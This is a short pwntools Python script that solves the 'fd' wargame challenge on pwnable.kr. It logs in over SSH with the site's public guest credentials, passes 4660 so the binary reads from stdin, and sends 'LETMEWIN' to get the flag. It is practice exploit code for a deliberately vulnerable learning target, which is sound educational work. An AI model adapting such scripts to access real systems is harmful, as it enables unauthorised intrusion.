from pwn import *
shell = ssh('fd', 'pwnable.kr', password='guest', port=2222)
sh = shell.run('bash')
sh.recv().decode()
sh.sendline('./fd 4660')
sh.sendline('LETMEWIN')
log.success(sh.recv().decode())
